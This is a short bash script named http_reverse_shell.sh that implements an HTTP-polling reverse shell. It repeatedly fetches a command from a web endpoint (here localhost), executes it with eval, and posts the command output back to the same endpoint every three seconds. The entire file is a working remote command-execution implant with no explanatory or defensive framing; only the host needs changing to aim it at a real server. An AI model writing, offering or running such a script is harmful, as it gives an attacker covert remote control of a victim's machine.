#!/bin/bash
# http_reverse_shell.sh

while true
do
    c=$(curl -s localhost/http_reverse_shell/?ready=true)
    [ -n "$c" ] && curl -X POST -s localhost/http_reverse_shell/ --data-urlencode "stdout=$(eval $c)"
    sleep 3
done
